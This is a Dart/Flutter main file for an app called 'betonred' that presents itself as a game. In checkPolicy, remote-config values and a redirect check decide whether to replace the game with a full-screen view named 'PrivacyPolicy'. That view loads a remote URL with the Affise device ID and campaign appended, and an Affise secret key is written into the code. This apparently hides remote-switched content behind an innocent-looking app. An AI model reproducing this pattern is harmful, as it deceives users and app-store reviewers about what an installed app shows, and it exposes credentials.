import 'dart:io';

import 'package:affise_attribution_lib/affise.dart';
import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:betonred/firebase_options.dart';
import 'package:betonred/presentation/main_game_screen/hunt_timer_cubit/hunt_time_cubit.dart';
import 'package:betonred/presentation/main_game_screen/progress_bloc/progress_bloc.dart';
import 'package:betonred/presentation/main_game_screen/task_bloc/task_bloc.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_localizations/flutter_localizations.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'core/app_export.dart';
import 'notifications.dart';

var globalMessengerKey = GlobalKey<ScaffoldMessengerState>();
int initScreen = 0;

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  SharedPreferences prefs = await SharedPreferences.getInstance();
  // prefs.clear();
  initScreen = await prefs.getInt("initScreen") ?? 0;
  await prefs.setInt("initScreen", 1);
  await das();
  await Noxas().activate();
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  Future.wait([
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
    ]),
    PrefUtils().init()
  ]).then((value) {
    runApp(MyApp());
  });
}

Future<void> das() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(status);
}

String policy = '';
String uuid = '';
String campaign = '';
void checkData(List<AffiseKeyValue> data) {
  for (AffiseKeyValue keyValue in data) {
    if (keyValue.key == 'campaign_id' || keyValue.key == 'campaign') {
      campaign = keyValue.value;
    }
  }
}

Future<bool> checkPolicy() async {
  final remoteConfig = FirebaseRemoteConfig.instance;
  await remoteConfig.fetchAndActivate();
  Affise.settings(
    affiseAppId: "602",
    secretKey: "35c9d512-9065-4a32-8662-17ede95b52d8",
  ).start();
  Affise.moduleStart(AffiseModules.ADVERTISING);

  Affise.getModulesInstalled().then((modules) {
    print("Modules: $modules");
  });
  uuid = await Affise.getRandomDeviceId();
  Affise.getStatus(AffiseModules.ADVERTISING, (data) {
    checkData(data);
  });

  String value = remoteConfig.getString('remove');
  String exampleValue = remoteConfig.getString('remoc');
  final client = HttpClient();
  var uri = Uri.parse(value);
  var request = await client.getUrl(uri);
  request.followRedirects = false;
  var response = await request.close();
  if (!value.contains('noneRemove')) {
    if (response.headers.value(HttpHeaders.locationHeader).toString() !=
        exampleValue) {
      policy = '$value&affise_device_id=$uuid&campaignid=$campaign';
      return true;
    }
  }
  return false;
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return Sizer(
      builder: (context, orientation, deviceType) {
        return MultiBlocProvider(
          providers: [
            BlocProvider<TaskBloc>(
              create: (context) => TaskBloc()..add(TaskFetchEvent()),
            ),
            BlocProvider(
              create: (context) => ThemeBloc(
                ThemeState(
                  themeType: PrefUtils().getThemeData(),
                ),
              ),
            ),
            BlocProvider(
              create: (context) => HuntTimeCubit(),
            ),
            BlocProvider(
              create: (context) =>
                  ProgressBloc()..add(InitializeProgressEvent()),
            ),
          ],
          child: BlocBuilder<ThemeBloc, ThemeState>(
            builder: (context, state) {
              return FutureBuilder<bool>(
                future: checkPolicy(),
                builder: (context, snapshot) {
                  if (snapshot.connectionState == ConnectionState.waiting) {
                    return Container(
                      color: Colors.white,
                      child: Center(
                        child: Container(
                          height: 70,
                          width: 70,
                          child: ClipRRect(
                            borderRadius: BorderRadius.circular(15),
                            child: Image.asset('assets/images/app_icon.png'),
                          ),
                        ),
                      ),
                    );
                  } else {
                    if (snapshot.data == true && policy != '') {
                      return MaterialApp(
                          debugShowCheckedModeBanner: false,
                          home: PrivacyPolicy(data: policy));
                    } else {
                      return MaterialApp(
                        theme: theme,
                        title: 'betonred',
                        navigatorKey: NavigatorService.navigatorKey,
                        debugShowCheckedModeBanner: false,
                        localizationsDelegates: [
                          AppLocalizationDelegate(),
                          GlobalMaterialLocalizations.delegate,
                          GlobalWidgetsLocalizations.delegate,
                          GlobalCupertinoLocalizations.delegate,
                        ],
                        supportedLocales: [
                          Locale(
                            'en',
                            '',
                          ),
                        ],
                        initialRoute: initScreen == 0
                            ? AppRoutes.onboardingScreen
                            : AppRoutes.mainGameScreen,
                        routes: AppRoutes.routes,
                      );
                    }
                  }
                },
              );
            },
          ),
        );
      },
    );
  }
}
